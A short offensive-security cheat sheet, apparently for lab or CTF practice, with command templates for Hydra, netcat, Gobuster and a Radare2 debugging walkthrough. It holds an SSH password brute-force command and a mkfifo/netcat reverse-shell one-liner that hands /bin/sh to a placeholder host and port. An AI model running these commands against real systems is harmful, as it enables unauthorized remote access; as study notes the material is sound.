# Common Tools Template Commands
## Author: JamesB9
## Description:
File containing commands that to use for each tools. Change the commands to suite individual needs and use cases.

### Hydra

	hydra -l [username] -P /usr/share/wordlists/rockyou.txt [IP] -t 4 ssh

### NETCAT

	nc -lvnp [PORT]
	mkfifo /tmp/lol;nc [IP] [PORT] 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol

### GoBuster

	gobuster dir -w /usr/share/wordlists/dirb/big.txt -u [URL] -x "html,php"

### Radare2
Radare2 is a framework for reverse engineering and analysing binaries. It can translate machine code into assembly which we can then read and debug.

Run Radare2 and open a binary file for use:

	r2 -d [FILE]

Analyse the program:

	aa

Once the analyses is complete, find the entry point; this is usually defined as main. Look for "sym.main" from the output of this command.

	afl

To examine the assembly code at main use pdf i.e. Print Disassembly Function.

	pdf @main

To analyse the program as it runs you can use breakpoints. Use the following command to set a command that the program should stop executing at. This will set a letter 'b' next to the address when viewing the assembly with pdf.

	db [MEMORY ADDRESS]

Once the breakpoint is set, run the program and view the assembly again.

	dc
	pdf

To view the contents at a memory address we use the following commands. The value after the @ can be found at the top of the printed assembly language. Look at the first few bytes.

	px @[MEMORY ADDRESS]

The command to run only 1 instruction (move to next instruction) is:

	ds

To view register variables, use the following command

	dr

If you make a mistake, the program can be reloaded.

	ood
